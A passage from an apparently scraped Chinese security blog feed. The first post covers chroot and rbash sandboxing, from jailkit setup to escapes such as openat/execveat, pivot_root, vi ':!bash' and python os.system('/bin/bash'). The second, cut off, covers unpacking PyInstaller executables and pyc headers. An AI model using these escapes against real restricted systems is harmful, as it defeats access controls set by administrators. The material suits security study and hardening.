shell</strong>：其他已经存在的 shell，或者你之后在原始环境中启动的 shell，都不受 <code>chroot</code> 的影响，它们仍然使用原来的根目录。</p><blockquote><p>chroot(2)<br>chroot - change root directory 用于编程接口下的根目录更改</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int <span class="built_in">chroot</span>(const char *path);</span><br><span class="line">path：要作为新根目录的路径。</span><br><span class="line">返回值：成功返回 0，失败返回 -1，并设置 errno 来指示错误类型。</span><br></pre></td></tr></table></figure><p>chroot的主要功能就是改变根目录</p><p>看起来很鸡肋，但是当你的电脑被入侵，而对方入侵的是你的chroot环境，那么他使用cd..&#x2F;就永远跳不出来，比如将chroot设置为&#x2F;tmp&#x2F;jail,他就只能到达&#x2F;tmp&#x2F;jail，不能到达真正的root位置，这样入侵者就只能在特定的文件里运行，将伤害限制在chroot沙盒</p><p>但是要注意使用，一般在测试的时候（也就是设置正确的时候）你能独立的操作chroot空间，也能很轻松的退出来。但如果设置错误(没有使用chdir”&#x2F;“），你的真实根目录就会完全变成chroot的根目录，但是能使用cd退出去 cd..&#x2F;..&#x2F;</p><h3 id="chroot使用及注意事项"><a href="#chroot使用及注意事项" class="headerlink" title="chroot使用及注意事项"></a>chroot使用及注意事项</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> /tmp/jail /bin/bash</span><br></pre></td></tr></table></figure><p>这样执行后会运行错误，因为chroot目录里没有库，可以说，它什么也没有</p><h4 id="chroot-目录最初的状态："><a href="#chroot-目录最初的状态：" class="headerlink" title="chroot 目录最初的状态："></a><strong><code>chroot</code></strong> <strong>目录最初的状态：</strong></h4><ol><li><p>没有系统工具：在 <code>chroot</code> 环境中最初是没有 <code>bash</code>、<code>ls</code>、<code>cat</code> 等常用工具的，除非你手动将它们复制进去。</p></li><li><p>没有库文件：任何程序在运行时所需的库文件也不会自动存在，必须手动添加。即使你将 <code>/bin/bash</code> 复制到 <code>chroot</code> 目录中，仍然需要手动复制与之相关的依赖库。</p></li><li><p>没有配置文件：<code>/etc/passwd</code>、<code>/etc/group</code>、<code>/etc/hosts</code> 等系统配置文件也不会存在，需要手动配置或复制。</p></li><li><p>目录结构：你需要手动创建或复制常见的目录结构，如 <code>/bin</code>、<code>/lib</code>、<code>/etc</code>、<code>/home</code>、<code>dev</code> 等，以使 <code>chroot</code> 环境类似于一个完整的系统。</p></li></ol><p><strong>虽然</strong> <strong><code>chroot</code></strong> <strong>在用户空间内，但文件系统隔离</strong></p><p>尽管 <code>chroot</code> 环境位于用户空间，它的工作原理是通过<strong>文件系统的隔离</strong>机制，给进程提供一个新的文件系统视图。在默认情况下，Linux 的文件系统是全局共享的，任何进程都可以访问 <code>/bin</code>、<code>/usr</code> 等目录。然而，通过 <code>chroot</code>，你可以将某个进程的文件系统访问限制在一个特定的目录下，防止其访问全局的系统资源</p><p>在这种情况下，可以安装busybox</p><p><a class="link"   href="https://www.busybox.net/" >https://www.busybox.net/<i class="fas fa-external-link-alt"></i></a></p><p><em>BusyBox</em> 是一个集成了一百多个最常用Linux 命令和工具（如 cat 、 echo 、 grep 、 mount 、 telnet 等）的精简工具箱,将它装入chroot目录即可正常执行命令</p><h3 id="jailkit——将攻击者关进chroot-jail"><a href="#jailkit——将攻击者关进chroot-jail" class="headerlink" title="jailkit——将攻击者关进chroot jail"></a>jailkit——将攻击者关进chroot jail</h3><p><a class="link"   href="https://olivier.sessink.nl/jailkit/" >https://olivier.sessink.nl/jailkit/<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>Jailkit 是一套实用程序，用于增强 chroot jails 的可能性。Jailkit 包含一组工具和配置文件，用于自动部署 chroot jails。Jailkit 还包含各种工具，用于将用户帐户限制为特定文件或特定命令，这些工具可通过配置文件进行配置。设置 chroot shell、限制为某些特定命令的 shell 或 chroot jail 内的守护进程要容易得多，并且可以使用这些实用程序自动完成。</p></blockquote><blockquote><p>Jailkit 是一套专门为安全而开发的工具。如果配置、系统设置或环境不是 100% 安全，它将以安全的方式中止，并向系统日志发送有用的日志消息来解释哪里出了问题。</p></blockquote><blockquote><p>Jailkit 是一款非常稳定的软件，拥有非常稳定和高质量的代码库。据悉，它被多家领先的 IT 安全公司的网络安全设备、多家大型企业的互联网服务器、互联网服务提供商的互联网服务器以及许多需要保护 cvs、sftp、shell 或守护进程的小型公司和私人用户所采用。</p></blockquote><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a><strong>使用</strong></h4><p>1.<strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install jailkit</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>创建 Jail 环境</strong></li></ol><p>使用 Jailkit 的 <code>jk_init</code> 命令来初始化 <code>chroot jail</code> 环境。创建一个目录作为新的根目录，并配置一些基础命令和工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /home/jail</span><br><span class="line">sudo jk_init -v /home/jail basicshell</span><br></pre></td></tr></table></figure><ul><li><code>basicshell</code> 是 Jailkit 提供的一组预定义的环境配置，它包括基本的 shell 工具，如 <code>ls</code>、<code>cp</code>、<code>mv</code> 等，供用户在 jail 中使用。</li></ul><ol start="3"><li><strong>将用户放入 Jail</strong></li></ol><p>使用 <code>jk_jailuser</code> 命令将用户 <code>attacker</code> 限制在 <code>chroot jail</code> 中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo jk_jailuser -m -j /home/jail attacker</span><br></pre></td></tr></table></figure><p>这会将 <code>attacker</code> 用户添加到 <code>chroot jail</code> 中，并确保该用户只能访问 jail 中的文件系统。</p><ol start="4"><li><strong>测试 Jail 环境</strong></li></ol><p>以用户 <code>attacker</code> 身份登录系统，检查是否被限制在 <code>chroot jail</code> 中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - attacker</span><br></pre></td></tr></table></figure><ul><li>登录成功后，用户会发现根目录 <code>/</code> 实际上是 <code>/home/jail</code>，且无法访问系统的其他文件。</li></ul><h4 id="扩展用法"><a href="#扩展用法" class="headerlink" title="扩展用法"></a>扩展用法</h4><ul><li>以上方法是把攻击者关进新的环境，但如果攻击者一开始就偷偷进入系统并新建用户，还在自己的用户下留了恶意文件呢，如何不让攻击者发现自己被发现了</li></ul><p>这个操作比较繁琐我就不一一写了，关键步骤就是新建一个<code>home/jail/home/username(已存在用户）</code>，然后将原用户的文件都复制进去，相应的权限都要一一转移，并且要确保已存在用户对<code>home/jail/home/username</code>操作的权限<code>sudo chown -R existinguser:existinguser /home/jail/home/existinguser</code></p><ul><li>如果在上面的步骤里不小心把自己的用户关进去了，如何释放</li></ul><ol><li><strong>修改用户的登录 shell</strong></li></ol><p>当将用户放入 Jailkit 管理的 <code>chroot jail</code> 环境时，通常会将用户的默认 shell 设置为 <code>jk_chrootsh</code>，<code>jk_chrootsh</code> 是 Jailkit 提供的一种特殊 shell，它能够在用户登录时，自动将该用户的根目录限制在指定的 <code>chroot</code> 环境中。要移出 jail，首先需要将用户的 shell 改回默认的 Bash 或其他常用 shell。</p><p>使用 <code>chsh</code>（change shell）命令更改用户的 shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh -s /bin/bash username</span><br></pre></td></tr></table></figure><p>2**.快照**</p><p>在进行操作前对虚拟机拍摄快照，情况不对则一键还原）</p><h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><ul><li><strong>chroot时存在已打开的资源</strong>：</li></ul><p>对于..&#x2F;的拦截只局限于chroot中，在chroot外的文件不受它控制，所以，如果在使用chroot时正打开了一个文件，那么即使还在chroot内，chroot能用一些复杂的系统调用来利用这些之前被打开的文件，像linux里的open和execve的at变体，openat接受已被打开的资源文件描述符和一条以这个资源为起点的相对路径，所以可以执行一个相对于之前打开的文件的程序，最终这会使你逃离chroot环境。</p><p>当前的工作目录是一个隐式开放资源，因此，当恶意代码获得控制权时，你的工作目录如果不在chroot里，会有问题。</p><p><strong><code>openat</code></strong> 和 **<code>execveat</code>**：这些系统调用的变体允许使用一个打开的文件描述符作为基础来执行文件操作。例如：</p><ul><li><p><code>openat(fd, &quot;../outside_directory&quot;, O_RDONLY)</code>：可以通过 <code>fd</code> 指向的目录路径访问 <code>chroot</code> 之外的文件，前提是 <code>fd</code> 指向的是 <code>chroot</code> 外的资源。</p></li><li><p><code>execveat(fd, &quot;some_program&quot;, ...)</code>：可以从 <code>chroot</code> 外部启动一个新的进程。</p></li><li><p><strong>chroot只能有一个</strong></p></li></ul><p>新chroot会覆盖旧chroot。如果你在chroot环境中拥有root权限，那么你可以设置一个chroot(chroot只有特权用户能设置），用新设置的chroot覆盖之前的chroot)</p><ul><li><strong>使用</strong> <strong><code>pivot_root()</code></strong></li></ul><p><code>pivot_root()</code> 是一个特殊的系统调用，通常用于容器和虚拟化环境，允许进程更改其根文件系统。攻击者可以尝试使用 <code>pivot_root()</code> 将根目录切换到 <code>chroot</code> 之外的目录，从而彻底逃逸。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ret = pivot_root(<span class="string">&quot;/new_root&quot;</span>, <span class="string">&quot;/old_root&quot;</span>); // 切换根目录</span><br></pre></td></tr></table></figure><ul><li><strong>未指定工作目录</strong></li></ul><p>如果进入 <code>chroot</code> 时没有更改工作目录，而当前的工作目录在 <code>chroot</code> 外，攻击者可以通过相对路径（如 <code>../</code>）导航回到 <code>chroot</code> 外部。工作目录是进程的一个隐式开放资源，如果未显式改变，仍然可以访问到 <code>chroot</code> 外的目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../  <span class="comment"># 访问 chroot 之外的目录</span></span><br></pre></td></tr></table></figure><ul><li><strong>可使用的工具：</strong></li></ul><p>chroot未隔离网络，使用网络下载工具然后脱离即可</p><p><a class="link"   href="https://github.com/earthquake/chw00t" >https://github.com/earthquake/chw00t<i class="fas fa-external-link-alt"></i></a></p><h3 id="chroot缺点"><a href="#chroot缺点" class="headerlink" title="chroot缺点"></a>chroot缺点</h3><p>1.chroot不提供其他形式的隔离，比如进程id</p><p><code>echo $$</code>能打印当前shell的进程id</p><p>如果杀死了当前chroot shell的进程id,相当于杀死了当前chroot环境，就能退出了</p><p>2.chroot也不隔离网络，就算在chroot环境也能使用外面的网络，这意味着可以在chroot里下载你所需要的用来破解chroot的工具或环境</p><p>3.容易逃离，如果你是root用户且chroot调用没有被阻塞，就可以使用“覆盖”来逃离</p><p>4.<code>chroot</code> 并不是一个完全安全的隔离机制，因为它只隔离文件系统视图，不隔离文件描述符、工作目录、以及进程通信等系统资源。</p><h2 id="restricted-bash"><a href="#restricted-bash" class="headerlink" title="restricted bash"></a>restricted bash</h2><p><a class="link"   href="https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html" >https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html<i class="fas fa-external-link-alt"></i></a></p><p>rbash限制以下操作：</p><blockquote><p><strong>禁止切换目录</strong>：用户无法使用 <code>cd</code> 命令更改当前工作目录。</p><p><strong>禁止修改****环境变量</strong>：用户不能设置或取消设置如 <code>SHELL</code>、<code>PATH</code>、<code>HISTFILE</code>、<code>ENV</code> 等重要的环境变量。</p><p><strong>禁止执行带有斜杠的命令</strong>：无法使用包含斜杠的命令（如 <code>/bin/ls</code>），避免用户绕过限制执行系统级命令。</p><p><strong>禁止输出重定向</strong>：<code>&gt;</code>、<code>&gt;&gt;</code>、<code>&amp;&gt;</code> 等重定向符号被禁用，防止用户修改文件或输出结果。</p><p><strong>禁止使用</strong> **<code>exec</code>**：无法用 <code>exec</code> 命令替换当前 shell，确保受限环境不会轻易被逃脱。</p><p><strong>不能关闭受限模式</strong>：用户不能通过 <code>set +r</code> 或其他方法禁用受限模式。</p></blockquote><p>正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lili@lili-virtual-machine:~/Desktop/myshare$ <span class="built_in">cd</span> ..</span><br><span class="line">lili@lili-virtual-machine:~/Desktop$ </span><br></pre></td></tr></table></figure><p>开启rbash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lili@lili-virtual-machine:~/Desktop/myshare$ rbash</span><br><span class="line">lili@lili-virtual-machine:~/Desktop/myshare$ <span class="built_in">cd</span> ..</span><br><span class="line">rbash: <span class="built_in">cd</span>: restricted</span><br></pre></td></tr></table></figure><h3 id="逃逸-1"><a href="#逃逸-1" class="headerlink" title="逃逸"></a>逃逸</h3><p>1.<strong>新建另一个shell</strong></p><p><code>rbash</code> 禁止直接执行带有斜杠的命令（如 <code>/bin/bash</code>），但是如果 <code>bash</code> 位于 <code>PATH</code> 目录中，用户可以直接运行 <code>bash</code> 或 <code>sh</code> 来启动一个新的、不受限制的 shell。</p><ul><li><code>PATH</code> 目录的位置</li></ul><p><code>PATH</code> 变量中的每个目录都用冒号（<code>:</code>）分隔，系统会按顺序在这些目录中查找可执行文件。常见的 <code>PATH</code> 目录如下：</p><blockquote><p>&#x2F;usr&#x2F;local&#x2F;sbin</p><p>&#x2F;usr&#x2F;local&#x2F;bin</p><p>&#x2F;usr&#x2F;sbin</p><p>&#x2F;usr&#x2F;bin</p><p>&#x2F;sbin</p><p>&#x2F;bin</p></blockquote><p>效果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[/usr/bin]</span><br><span class="line">└─$ rbash</span><br><span class="line">┌──(pwn㉿kali)-[/usr/bin]</span><br><span class="line">└─$ <span class="built_in">cd</span> ..                                                                                                                      </span><br><span class="line">rbash: <span class="built_in">cd</span>: 受限</span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[/usr/bin]</span><br><span class="line">└─$ bash                                                                                                                       </span><br><span class="line">┌──(pwn㉿kali)-[/usr/bin]</span><br><span class="line">└─$ <span class="built_in">cd</span> ..                                                                                                                      </span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[/usr]</span><br><span class="line">└─$       </span><br></pre></td></tr></table></figure><p>2.<strong>使用**<strong>vi</strong></strong>,nano等编辑器逃脱**</p><p><code>vi</code>后，输入<code>:!bash</code>,就可以新建一个bash,该bash无限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lili@lili-virtual-machine:~/Desktop/myshare$ <span class="built_in">cd</span> ..</span><br><span class="line">rbash: <span class="built_in">cd</span>: restricted</span><br><span class="line">lili@lili-virtual-machine:~/Desktop/myshare$ vi</span><br><span class="line"></span><br><span class="line">lili@lili-virtual-machine:~/Desktop/myshare$ <span class="built_in">cd</span> ..</span><br><span class="line">lili@lili-virtual-machine:~/Desktop$ </span><br></pre></td></tr></table></figure><p>3.<strong>SSH</strong> <strong>远程命令执行</strong></p><p>通过 SSH 连接到服务器并直接执行一个新命令，而不会进入 <code>rbash</code>。例如，使用 SSH 执行 <code>bash</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@server bash</span><br></pre></td></tr></table></figure><p>4.<strong>使用编程语言</strong></p><p>直接执行无法执行，但是可以使用python之类的编辑器来执行文件，test.py文件内容为<code>print(&quot;exe a file&quot;)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[~/桌面/shellcode]</span><br><span class="line">└─$ ./test.py</span><br><span class="line">rbash: ./test.py: 受限：无法在命令名中使用 <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[~/桌面/shellcode]</span><br><span class="line">└─$ python test.py                                                                                                             </span><br><span class="line">exe a file</span><br></pre></td></tr></table></figure><p>执行bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[~/桌面/shellcode]</span><br><span class="line">└─$ cd ..                                                                                                                      </span><br><span class="line">rbash: cd: 受限</span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[~/桌面/shellcode]</span><br><span class="line">└─$ python -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;                                                                              </span><br><span class="line">┌──(pwn㉿kali)-[~/桌面/shellcode]</span><br><span class="line">└─$ cd ..                                                                                                                      </span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$         </span><br></pre></td></tr></table></figure><h2 id="chroot-rbasn"><a href="#chroot-rbasn" class="headerlink" title="chroot+rbasn"></a>chroot+rbasn</h2><p><strong>要点</strong></p><ul><li><strong><code>chroot</code></strong> <strong>创建隔离的文件系统</strong></li></ul><p><code>chroot</code> 将用户的根目录限制在一个指定的文件系统，使得用户无法访问系统的其余部分。即使用户尝试访问 <code>/</code>，实际上访问的也是 <code>chroot jail</code> 内部的文件</p><ul><li><strong><code>rbash</code></strong> <strong>限制用户操作</strong></li></ul><p><code>rbash</code>（受限 Bash）进一步限制用户对文件系统和系统命令的操作，禁止更改目录、修改环境变量、使用重定向等。将用户的 shell 设置为 <code>rbash</code>，可以防止用户在 <code>chroot jail</code> 中逃脱出来或执行非预期的操作。</p><h3 id="防范措施（反逃逸"><a href="#防范措施（反逃逸" class="headerlink" title="防范措施（反逃逸)"></a>防范措施（反逃逸)</h3><p>基本上就是和前面的“逃逸”反着来，能使用python就禁用python，能使用编辑器就禁用编辑器</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>pwn.college - Sandboxing - chroot</p><p><a class="link"   href="https://atum.li/2017/04/25/linuxsandbox/#chroot-jail" >https://atum.li/2017/04/25/linuxsandbox/#chroot-jail<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.baeldung.com/linux/sandboxing-process" >https://www.baeldung.com/linux/sandboxing-process<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;chroot介绍&quot;&gt;&lt;a href=&quot;#chroot介绍&quot; class=&quot;headerlink&quot; title=&quot;chroot介绍&quot;&gt;&lt;/a&gt;chroot介绍&lt;/h2&gt;&lt;p&gt;通常来说，提到chroot一般有两个含义，chroot(1)是&amp;#x2F;usr&amp;#x2F;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python逆向</title>
    <link href="http://arch3rn4r.github.io/2024/09/18/python%E9%80%86%E5%90%91/"/>
    <id>http://arch3rn4r.github.io/2024/09/18/python%E9%80%86%E5%90%91/</id>
    <published>2024-09-18T13:23:23.000Z</published>
    <updated>2025-05-02T02:41:59.107Z</updated>
    
    <content type="html"><![CDATA[<p>参照此文章编写<a class="link"   href="https://rocky.github.io/blackhat-asia-2024-additional/all-notes-print" >https://rocky.github.io/blackhat-asia-2024-additional/all-notes-print<i class="fas fa-external-link-alt"></i></a></p><p>Python 字节码的变化非常大，每个版本之间都有很大的区别。高级字节码的一个方面：许多源信息（如变量名称及其类型）都保存在字节码中。所以反编译回来的程序会和源代码非常像（简直一模一样）。但是来自源文本的注释不会显示在重建结果中，这是因为这些注释不会出现在字节码中的任何位置。</p><p>The disassembler is great with code that doesn’t have jumps in it. But once we have jumps, like we have in the highlighted instructions, a disassembler has to stop combining instructions.</p><p>反汇编器非常适合没有跳转的代码。但是，一旦我们有了跳转，就像我们在突出显示的指令中一样，反汇编器必须停止组合指令。</p><p>With each new Python release, control flow decompilation has become increasingly more difficult. Nowadays, about 1&#x2F;3 of the issues raised in the decompiler bug trackers are related to control flow.</p><p>随着每个新的 Python 版本的发布，控制流反编译变得越来越困难。如今，反编译器错误跟踪器中提出的问题中约有 1&#x2F;3 与控制流有关。</p><p>Grammars and the grammar-based approach we use, however, can naturally parse nesting and sequencing control structures quite well. So having a methodical way to characterize control flow that fits into the decompiler parsing can give more precision and accuracy that is not available in general-purpose decompilers</p><p>然而，语法和我们使用的基于语法的方法可以很自然地很好地解析嵌套和排序控制结构。因此，有一种有条不紊的方法来表征适合反编译器解析的控制流，可以提供通用反编译器所不具备的更高的精度和准确性</p><p>There are other decompilers for Python. They all start out with a disassembly, even the one I looked at that uses machine learning. Many build a tree—more or less—based on instructions from a disasssembly, and they all produce source text from that internal tree-ish structure.</p><p>Python 还有其他反编译器。它们都是从拆解开始的，即使是我看到的那个使用机器学习的拆解。许多人或多或少地根据反汇编的指令构建了一棵树，并且它们都从内部的树状结构中生成源文本。</p><p>However, they are a bit more ad hoc. None use the grammar-based approach here. The phases are fewer and a little less distinct.</p><p>但是，它们更具临时性。这里没有使用基于语法的方法。相位较少，也不太明显。</p><p>General-purpose decompilers like you find in Ghidra are largely different. They live in a more complicated world. To be able to do things across a wider spectrum of machine languages and a wider spectrum of programming-language environments, they largely give up on the hope of noticing specific patterns of instructions. This came up in the chained-comparison example. The ability to match specific patterns is what makes these decompilers produce extremely intuitive and accurate results and written in the programming language that the source text was also written in.</p><p>像你在 Ghidra 中发现的通用反编译器有很大不同。他们生活在一个更加复杂的世界里。为了能够在更广泛的机器语言和更广泛的编程语言环境中做事，他们在很大程度上放弃了注意到特定指令模式的希望。这出现在链式比较示例中。匹配特定模式的能力使这些反编译器能够产生极其直观和准确的结果，并且是用编写源文本的编程语言编写的。</p><p>Control Flow, in General-purpose decompilers, is its own canned phase. This phase doesn’t take into account the specific target programming language that produced the code and the specific set of control-flow structures that the source language has.</p><p>在通用反编译器中，控制流是它自己的固定阶段。此阶段不考虑生成代码的特定目标编程语言以及源语言具有的特定控制流结构集。</p><p>Our control flow is intimately tied to the control flow for a particular Python version. When Python added a new construct like “async” co-routines in Python 3.5, it added a new kind of control-flow pattern match. Python has an extremely rich set of control-flow structures. I know of no canned control-flow-detection mechanism that would be able to cover all control-flow mechanisms that Python includes like the “else” clauses on “while”, “for”, and “try” blocks.</p><p>我们的控制流与特定 Python 版本的控制流密切相关。当 Python 在 Python 3.5 中添加类似“异步”协程的新构造时，它添加了一种新的控制流模式匹配。Python 具有一组极其丰富的控制流结构。据我所知，没有一种预制的控制流检测机制能够涵盖 Python 包含的所有控制流机制，例如“while”、“for”和“try”块上的“else”子句。</p><p>Our approach uses tokenization to facilitated parsing. This is similar to the lift phase that general-purpose decompilers often do after initial disassembly . In general-purpose decompilers, the lifting language is sometimes to LLVM or an LLVM-like language. In Python, our intermediate language is very much tied to Python bytecode. In general, that is true for all high-level bytecode decompilers. The intermediate code looks like the high-level bytecode. Also, this intermediate language drifts over time along with the language and bytecode drift.</p><p>我们的方法使用标记化来促进解析。这类似于通用反编译器在初始反汇编后经常执行的提升阶段。在通用反编译器中，提升语言有时是 LLVM 或类似 LLVM 的语言。在 Python 中，我们的中间语言与 Python 字节码密切相关。通常，所有高级字节码反编译器都是如此。中间代码类似于高级字节码。此外，这种中间语言会随着语言和字节码的漂移而漂移。</p><p>作者给出了实验性的新代码，Chained Compare Parse Tree 链式比较解析树</p><h2 id="python开发"><a href="#python开发" class="headerlink" title="python开发"></a>python开发</h2><p>python打包成exe的方法<a class="link"   href="https://saucer-man.com/information_security/825.html" >https://saucer-man.com/information_security/825.html<i class="fas fa-external-link-alt"></i></a></p><p>编写了个小代码来进行下面的逆向</p><p>pyinstaller -F -w -n active exercise.py</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>F 或 <span class="comment">--onefile：这个选项告诉 PyInstaller 将所有文件打包进一个单独的可执行文件中。这样做的好处是分发和运行应用程序更为简单，因为所有依赖项都包含在这个单一文件中。</span></span><br><span class="line"><span class="operator">-</span>w 或 <span class="comment">--windowed：这个选项用于指定应用程序应该在没有控制台窗口的情况下运行。这对于图形用户界面（GUI）应用程序特别有用，因为它可以让应用程序在运行时不会显示命令行窗口。</span></span><br><span class="line"><span class="operator">-</span>n 或 <span class="comment">--name：这个选项允许你指定打包后可执行文件的名称。在这个例子中，可执行文件的名称将是 active。</span></span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240918/1280X1280-(1).45hmk0kgkd.webp"                                        ></p><p>(太容易报毒了建议暂时关掉防护，把我刚生成的exe文件删掉了）</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240918/c58752b4-390b-4df2-a0a4-0100ade21a53.pfarxb471.webp"                                        ></p><h2 id="解包exe"><a href="#解包exe" class="headerlink" title="解包exe"></a>解包exe</h2><p><strong>Pyinstxtractor</strong></p><p>Pyinstxtractor可以解包exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://sourceforge.net/projects/pyinstallerextractor/</span><br><span class="line">python pyinstxtractor.py  待解包的文件名.exe</span><br></pre></td></tr></table></figure><p>执行后就像这样</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240918/27949373-07cb-4d55-bf34-2e9341c35f37.5mnrlrpgag.webp"                                        ></p><p>一般来说我们会获得一个和我们解包的exe同名的pyc文件，这个时候就和第一种类型题目一样，将pyc文件还原成py文件进行逆向即可。</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240918/400e1220-c29e-444a-9973-1cf9f69273f8.1e8kbxzbw6.webp"                                        ></p><h3 id="解包文件后文件组成"><a href="#解包文件后文件组成" class="headerlink" title="解包文件后文件组成"></a>解包文件后文件组成</h3><p><code>PYZ-00.pyz_extracted</code>非常重要，一般一个稍微大一点的项目都会分成多个<code>py</code>文件，甚至会依赖其他模块，这些被依赖的文件解析后都会放入<code>PYZ-00.pyz_extracted</code>中，可以说这里放的是核心代码。</p><h2 id="pyc逆向"><a href="#pyc逆向" class="headerlink" title="pyc逆向"></a>pyc逆向</h2><h3 id="pyc结构"><a href="#pyc结构" class="headerlink" title="pyc结构"></a>pyc结构</h3><p>pyc文件分为<strong>pyc文件头部分</strong>和<strong>PyCodeObject部分。</strong>文件头部分即为上文中谈到的魔数时间戳部分，而PyCodeObject是在CPython（Python 的官方解释器实现）中用来表示编译后的代码对象的结构体。实际上，pyc 文件就是 PyCodeObject 对象在硬盘上的保存形式。</p><p>不同版本的python的魔数头</p><p><strong>PyObject_HEAD</strong></p><p>不同的 Python 版本会有不同的 PyObject_HEAD：</p><style> td {white-space:nowrap;border:1px solid #dee0e3;font-size:10pt;font-style:normal;font-weight:normal;vertical-align:middle;word-break:normal;word-wrap:normal;}</style><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Python 版本</td><td>十六进制文件头</td></tr><tr><td>Python 2.7</td><td>03f30d0a00000000</td></tr><tr><td>Python 3.0</td><td>3b0c0d0a00000000</td></tr><tr><td>Python 3.1</td><td>4f0c0d0a00000000</td></tr><tr><td>Python 3.2</td><td>6c0c0d0a00000000</td></tr><tr><td>Python 3.3</td><td>9e0c0d0a0000000000000000</td></tr><tr><td>Python 3.4</td><td>ee0c0d0a0000000000000000</td></tr><tr><td>Python 3.5</td><td>170d0d0a0000000000000000</td></tr><tr><td>Python 3.6</td><td>330d0d0a0000000000000000</td></tr><tr><td>Python 3.7</td><td>420d0d0a000000000000000000000000</td></tr><tr><td>Python 3.8</td><td>55 0d 0d 0a 00 00 00 00 00 00 00 00 00 00 00 00</td></tr><tr><td>Python 3.9</td><td>610d0d0a000000000000000000000000</td></tr><tr><td>Python 3.10</td><td>6f0d0d0a000000000000000000000000</td></tr><tr><td>Python 3.11</td><td>a70d0d0a000000000000000000000000</td></tr></tbody></table><p><strong>PyCodeObject 的结构如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 